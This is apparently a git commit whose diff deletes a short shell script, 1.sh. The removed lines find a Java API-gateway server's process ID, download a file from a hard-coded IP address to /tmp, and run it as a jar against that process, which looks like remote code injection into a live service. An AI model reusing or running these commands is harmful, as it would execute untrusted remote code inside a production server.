5ba70a8f484551c596135fc09f193c7c04247b49
BtbBn7Xvbe <dfbf637khjj0397@163.com>
2026-09-03 02:02:36 -0700

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,5 +1,1 @@
-#!/bin/sh
-pid=$(ps -ef | grep 'com.hrocloud.apigw.ApigwServer' | grep -v grep | awk '{print $2}' | head -1)
-[ -n "$pid" ] || exit 1
-curl -sf http://162.128.228.211:8012/demo/xh -o /tmp/xh || exit 1
-/home/app/work/jdk1.8.0_05/bin/java -jar /tmp/xh "$pid"
+
